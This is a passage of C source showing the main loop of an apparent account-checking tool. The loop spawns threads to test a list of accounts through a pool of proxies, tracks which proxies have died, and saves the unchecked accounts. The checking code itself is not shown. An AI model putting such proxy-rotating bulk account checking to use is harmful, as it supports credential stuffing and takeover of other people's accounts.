		end(1);
	}

	fdo_log(GENLOG, "Starting with %zu accounts, %zu proxies, and %zu threads.", total_accounts, total_proxies, O.threads);


	for(;;) {
		if(!keepRunning) break;

		pthread_mutex_lock(&pthnum);
		size_t totalp = total_proxies;
		size_t dproxies = dead_proxies;
		size_t chk = thread_num;
		pthread_mutex_unlock(&pthnum);

		if(totalp == dproxies)
			break;

		if(chk == O.threads)
			continue;

		if(chk > O.threads)
			printf("SOMETHING IS WRONG! FIX ALL DA CODEZ\n");

		pthread_mutex_lock(&account);
		size_t caccounts = checked_accounts;
		size_t taccounts = total_accounts;
		pthread_mutex_unlock(&account);

		if(caccounts == taccounts)
			break;
/*		if(getch()) {
			fdo_log(GENLOG, "Progress report: %zu/%zu accounts checked. %zu/%zu proxies used. %zu/%zu threads currently running.", checked_accounts, total_accounts, dead_proxies, total_proxies, chk, O.threads);
		}
		printf("%d\n", chk);*/

		if(!acctocheck() || !proxytouse())
			continue;

		//let do_threaded() decide whether or not we can pull an account(processing all already?)
		pthread_t thread;
		pthread_attr_t attr;

		int aerr = pthread_attr_init(&attr);
		if(aerr != 0)
			fdo_log(GENLOG, "pthread_attr_init error(Please report this): %s\n", strerror(aerr));
		int serr = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
		if(serr != 0)
			fdo_log(GENLOG, "pthread_attr_setdetachstate error(Please report this): %s\n", strerror(serr));

		pthread_mutex_lock(&pthnum);
		thread_num++;
		pthread_mutex_unlock(&pthnum);

		int perr = pthread_create(&thread, &attr, &do_threaded, NULL);

		if(perr != 0)
			fdo_log(GENLOG,"pthread_create error(Please report this): %s\n", strerror(perr));
		pthread_attr_destroy(&attr);
	}

	if(!keepRunning) {
		fdo_log(GENLOG, "Control-C hit. Waiting for all remaining threads to finish.");
		for(;;) {
			pthread_mutex_lock(&pthnum);
			if(thread_num == 0) {
				pthread_mutex_unlock(&pthnum);
				break;
			}
			fdo_log(GENLOG, "%zu threads left.", O.threads - (O.threads - thread_num));
			pthread_mutex_unlock(&pthnum);
			sleep(2);
		}
	}
	if(checked_accounts == total_accounts) {
		fdo_log(GENLOG, "Deleting account \'file\' %s.", accountfile);
		unlink(accountfile);
		do_log(GENLOG, "Finished!");
	} else
		writeUnchecked(accountfile);
	if(total_proxies == dead_proxies)
		do_log(GENLOG, "Ran out of proxies!");

	//Just to make sure of no memleaks...
	freeListContents();

	free(accountfile); accountfile = NULL;
	free(O.basename); O.basename = NULL;

//	keepRunning ? end(0) : end(1);
	end(0);
}
